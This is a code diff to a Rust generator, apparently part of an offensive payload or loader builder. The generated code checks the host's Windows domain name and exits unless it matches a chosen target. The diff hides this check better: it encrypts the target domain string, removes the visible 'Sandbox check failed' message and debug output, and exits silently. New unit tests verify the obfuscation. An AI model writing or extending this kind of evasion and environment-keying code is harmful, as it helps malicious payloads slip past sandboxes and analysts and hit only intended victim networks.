@@ -1,4 +1,4 @@
-use crate::tools::SandboxOutput;
+use crate::tools::{litcrypt_string_expr, SandboxOutput};
 
 pub fn build_sandbox(expected_domain: &str) -> SandboxOutput {
     if expected_domain.is_empty() {
@@ -8,6 +8,7 @@ pub fn build_sandbox(expected_domain: &str) -> SandboxOutput {
         };
     }
 
+    let expected_domain = litcrypt_string_expr(expected_domain);
     let sandbox_function = format!(
         "fn get_domain_name() -> Option<String> {{
             let mut size: u32 = 256;
@@ -29,20 +30,15 @@ pub fn build_sandbox(expected_domain: &str) -> SandboxOutput {
             }}
             Some(domain_name)
         }}
-        fn sandbox() {{
+        fn sandbox() -> bool {{
             match get_domain_name() {{
-                Some(domain) => {{
-                    println!(\"Domain: {{}}\",domain);
-                    if !domain.as_str().eq_ignore_ascii_case(\"{0}\") {{
-                        panic!(\"Sandbox check failed\");
-                    }}
-                }}
-                None => {{
-                    panic!(\"Sandbox check failed\");
-                }}
+                Some(domain) => domain.as_str().eq_ignore_ascii_case({0}.as_str()),
+                None => false,
             }}
         }}
-        sandbox();",
+        if !sandbox() {{
+            return;
+        }}",
         expected_domain
     );
 
@@ -52,5 +48,32 @@ pub fn build_sandbox(expected_domain: &str) -> SandboxOutput {
     SandboxOutput {
         sandbox_function,
         sandbox_import,
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_empty_domain_disables_sandbox_code() {
+        let output = build_sandbox("");
+        assert!(output.sandbox_function.is_empty());
+        assert!(output.sandbox_import.is_empty());
+    }
+
+    #[test]
+    fn test_sandbox_domain_is_litcrypt_wrapped() {
+        let output = build_sandbox("MYDOMAIN");
+        assert!(output.sandbox_function.contains("lc!(\"MYDOMAIN\")"));
+        assert!(!output.sandbox_function.contains("Sandbox check failed"));
+    }
+
+    #[test]
+    fn test_sandbox_domain_with_escape_falls_back_to_plain_string() {
+        let output = build_sandbox(r#"DOMAIN\LAB"#);
+        assert!(output
+            .sandbox_function
+            .contains(r#""DOMAIN\\LAB".to_string()"#));
     }
 }
